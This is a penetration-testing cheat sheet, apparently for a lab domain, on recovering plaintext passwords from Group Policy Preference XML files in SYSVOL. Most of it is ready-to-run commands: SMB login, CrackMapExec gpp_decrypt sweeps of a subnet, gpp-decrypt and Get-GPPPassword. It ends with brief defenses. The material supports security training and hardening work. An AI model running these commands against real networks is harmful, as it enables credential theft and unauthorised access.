# GROUP POLICY PREFERENCE (GPP) ATTACKS

Extract plaintext passwords from Group Policy Preferences stored in SYSVOL. This is a critical vulnerability because AD stores passwords in XML files that can be decrypted with known keys.

## Overview

- **Vulnerability**: Group Policy Preferences stored passwords in cPassword attribute on AD domain controllers in SYSVOL
- **Impact**: Plaintext password recovery for service accounts and local administrators
- **Timeline**: Vulnerability patched in MS14-025 (May 2014), but many legacy systems still vulnerable

## Finding GPP Files

### Search on Domain Controller
```bash
impacket-smbclient MARVEL.local/fcastle:Password1@10.0.2.15
# Navigate to: \SYSVOL\MARVEL.local\Policies\
# Look for: Groups.xml, Services.xml, Printers.xml, DataSources.xml, Tasks.xml, ScheduledTasks.xml
```

### Using CrackMapExec
```bash
crackmapexec smb 10.0.2.15 -u fcastle -d MARVEL.local -p Password1 -M gpp_decrypt
```

## Decrypt GPP Passwords

### Using gpp-decrypt (Python)
```bash
gpp-decrypt cPassword_value
# Example:
gpp-decrypt "j1Uyj3xQwJUN1l1+cHyhXA=="
```

### Using Get-GPPPassword (PowerShell)
```powershell
. .\Get-GPPPassword.ps1
Get-GPPPassword
```

### Using CrackMapExec gpp_decrypt Module
```bash
crackmapexec smb 10.0.2.0/24 -u fcastle -p Password1 -d MARVEL.local -M gpp_decrypt
```

## Tools & Resources

- **Get-GPPPassword.ps1**: PowerShell script to find and decrypt GPP passwords
- **gpp-decrypt**: Python tool available in most pentesting distros
- **CrackMapExec**: Automated module for bulk GPP enumeration

## Defense

- Apply MS14-025 patch immediately
- Delete old Group Policy Preference files with passwords
- Monitor SYSVOL for suspicious XML files
- Implement strong password policies
- Restrict SYSVOL read access